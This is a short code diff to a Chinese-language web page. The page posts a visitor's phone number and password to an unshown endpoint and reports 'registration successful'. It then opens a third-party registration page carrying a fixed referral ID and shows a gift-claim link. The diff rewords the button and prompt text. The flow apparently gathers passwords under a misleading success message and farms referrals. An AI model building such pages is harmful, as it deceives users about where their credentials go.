@@ -85,7 +85,8 @@
 
     <div class="step" id="giftSection" style="display:none;">
       <div class="step-title">领取礼包</div>
-      <a id="giftBtn" href="http://blx.longliqi.com/goodDetail.html?goods_id=203" target="_blank" class="button">→ 前往礼包页面</a>
+      <p style="font-size: 14px; color: #555;">请完成官方平台注册后再点击下方按钮领取礼包</p>
+      <a id="giftBtn" href="http://blx.longliqi.com/goodDetail.html?goods_id=203" target="_blank" class="button">→ 我已完成注册，前往礼包页面</a>
     </div>
 
     <div class="login-link">
@@ -117,10 +118,10 @@
         },
         body: JSON.stringify({ phone, password })
       }).then(() => {
-        alert("注册成功，请完成验证码验证");
-        // 跳转倍莱鲜注册页
+        alert("注册成功，请在新页面完成验证码验证");
+        // 跳转倍莱鲜注册页（用户验证短信验证码）
         window.open(`http://blx.longliqi.com/register.html?referee_id=1749824&mobile=${encodeURIComponent(phone)}`, '_blank');
-        // 显示礼包领取按钮
+        // 显示礼包跳转按钮
         document.getElementById("giftSection").style.display = 'block';
       }).catch(() => {
         alert("注册失败，请稍后再试");
